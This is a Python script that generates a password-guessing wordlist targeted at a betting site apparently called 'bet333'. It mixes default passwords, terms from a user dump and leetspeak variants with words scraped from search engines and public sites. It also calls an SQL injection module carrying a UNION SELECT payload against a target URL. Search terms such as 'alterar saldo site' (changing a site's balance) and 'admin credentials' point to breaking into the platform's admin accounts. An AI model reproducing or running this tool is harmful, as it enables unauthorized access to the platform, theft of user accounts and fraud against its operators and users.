import re
import os
import json
import hashlib
import requests
from bs4 import BeautifulSoup
from itertools import product
from urllib.parse import quote_plus
from fake_useragent import UserAgent

class WordlistGenerator:
    def __init__(self, dump_file='dump_users.txt', tested_file='wordlist_tested.txt'):
        self.base_terms = set([
            'admin', '123456', 'password', 'senha', 'betadmin', 'bet333',
            'user', 'root', 'qwerty', 'abc123', 'letmein'
        ])
        self.tested_words = self.load_tested(tested_file)
        self.enriched_terms = set()
        self.dump_file = dump_file
        self.ua = UserAgent()

    def load_tested(self, filepath):
        if not os.path.exists(filepath):
            return set()
        with open(filepath, 'r') as f:
            return set([line.strip() for line in f.readlines()])

    def leetspeak_variants(self, word):
        substitutions = {
            'a': ['4', '@'], 'e': ['3'], 'i': ['1', '!'], 'o': ['0'], 's': ['$', '5']
        }
        variants = set()
        for i in range(1, 2 ** len(word)):
            chars = list(word)
            for j, char in enumerate(word):
                if char.lower() in substitutions and (i >> j) & 1:
                    chars[j] = substitutions[char.lower()][0]
            variants.add(''.join(chars))
        return variants

    def extract_terms_from_dump(self):
        if not os.path.exists(self.dump_file):
            return
        with open(self.dump_file, 'r') as f:
            for line in f:
                words = re.findall(r'\w+', line)
                for word in words:
                    self.base_terms.add(word.lower())

    def search_database_terms(self, target_url):
        """Extract terms from target database through SQL injection"""
        try:
            from .sql_injector import SQLInjector
            injector = SQLInjector()
            # Try to extract column names and table data
            query = "' UNION SELECT column_name,null FROM information_schema.columns--"
            terms = injector.detect_vulnerable_fields(target_url)
            self.enriched_terms.update(terms)
        except Exception as e:
            print(f"Error extracting DB terms: {e}")

    def search_duckduckgo(self, query):
        url = f"https://html.duckduckgo.com/html/?q={quote_plus(query)}"
        headers = {'User-Agent': self.ua.random}
        try:
            response = requests.get(url, headers=headers, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            results = soup.find_all('a', {'class': 'result__a'})
            for result in results:
                self.enriched_terms.update(re.findall(r'\w+', result.get_text()))
        except Exception as e:
            print(f"Erro DuckDuckGo: {e}")

    def scrape_public_sites(self):
        sources = [
            # Sites governamentais
            "https://www.gov.br/", "https://www.tse.jus.br/", 
            "https://www.usa.gov/", "https://www.europa.eu/",
            # Sites organizacionais
            "https://www.un.org/", "https://www.who.int/",
            "https://www.unicef.org/", "https://www.amnesty.org/",
            # Redes sociais
            "https://www.facebook.com", "https://www.instagram.com",
            "https://www.linkedin.com", "https://www.twitter.com",
            "https://www.youtube.com", "https://www.reddit.com",
            "https://www.pinterest.com", "https://www.tiktok.com",
            # Plataformas técnicas
            "https://www.github.com", "https://www.gitlab.com",
            "https://www.bitbucket.org", "https://www.stackoverflow.com"
        ]
        
        for url in sources:
            try:
                response = requests.get(url, headers={'User-Agent': self.ua.random}, timeout=10)
                text = BeautifulSoup(response.text, 'html.parser').get_text()
                words = re.findall(r'\w+', text)
                self.enriched_terms.update([w.lower() for w in words if 5 <= len(w) <= 12])
            except Exception as e:
                print(f"Erro scraping site {url}: {e}")

    def scrape_social_media_titles(self, queries):
        search_base = "https://html.duckduckgo.com/html/?q="
        platforms = [
            "site:facebook.com", "site:instagram.com", "site:x.com", 
            "site:youtube.com", "site:threads.net", "site:tiktok.com",
            "site:linkedin.com", "site:github.com", "site:gitlab.com",
            "site:bitbucket.org", "site:stackoverflow.com",
            "site:reddit.com", "site:pinterest.com",
            "site:tumblr.com", "site:medium.com",
            "site:.gov", "site:.org", "site:.edu"
        ]
        for q in queries:
            for p in platforms:
                full_query = quote_plus(f"{q} {p}")
                url = f"{search_base}{full_query}"
                try:
                    resp = requests.get(url, headers={'User-Agent': self.ua.random}, timeout=10)
                    soup = BeautifulSoup(resp.text, 'html.parser')
                    for result in soup.find_all('a', {'class': 'result__a'}):
                        self.enriched_terms.update(re.findall(r'\w+', result.get_text()))
                except Exception as e:
                    print(f"Erro em {p}: {e}")

    def generate_wordlist(self, output_file='wordlist_final.txt', target_url=None):
        self.extract_terms_from_dump()
        
        # Try to extract terms from target database if URL provided
        if target_url:
            self.search_database_terms(target_url)
        
        for base in list(self.base_terms):
            self.base_terms.update(self.leetspeak_variants(base))

        # Enhanced search queries for better coverage
        search_queries = [
            "bet333 login admin senha user pass",
            "betting site admin credentials",
            "gambling platform security",
            "online casino management",
            "betting system administration"
        ]
        
        for query in search_queries:
            self.search_duckduckgo(query)
        
        self.scrape_public_sites()
        self.scrape_social_media_titles([
            "bet333", "admin login", "alterar saldo site",
            "betting admin", "casino management", "platform security"
        ])

        final_words = (self.base_terms | self.enriched_terms) - self.tested_words
        final_words = sorted(set([w.lower() for w in final_words if 5 <= len(w) <= 32]))

        with open(output_file, 'w') as f:
            for word in final_words:
                f.write(word + '\n')
        print(f"[+] Wordlist gerada com {len(final_words)} palavras: {output_file}")

if __name__ == "__main__":
    gen = WordlistGenerator()
    gen.generate_wordlist()
